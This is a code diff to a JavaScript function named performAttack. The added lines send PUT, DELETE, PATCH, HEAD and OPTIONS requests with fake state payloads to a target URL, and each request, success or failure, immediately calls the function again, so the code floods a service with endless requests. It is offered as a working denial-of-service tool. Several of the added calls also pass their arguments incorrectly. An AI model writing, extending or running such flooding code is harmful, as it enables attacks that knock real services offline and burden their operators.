@@ -194,7 +194,58 @@ const performAttack = (url, agent) => {
         .catch(() => {
             setTimeout(() => performAttack(url, agent), 0);
         });
+        
+    axios.put(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+        axios.delete(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+    axios.patch(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+        
+        axios.head(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
 
+        axios.options(url, {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+
+        
     axios.get(url, {
         httpAgent: agent,
         headers: headersForRequest,
